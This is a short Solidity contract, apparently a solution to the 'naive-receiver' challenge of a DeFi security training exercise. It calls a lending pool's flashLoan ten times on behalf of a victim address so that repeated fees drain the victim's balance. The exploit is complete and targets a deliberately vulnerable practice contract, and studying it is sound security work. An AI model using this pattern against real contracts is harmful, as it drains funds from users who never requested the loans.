// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveAttacker{

    NaiveReceiverLenderPool private pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function flashLoan(address userAddress) external{
        for(uint i = 0; i < 10; i ++){
            pool.flashLoan(userAddress, 1);
        }
    }

}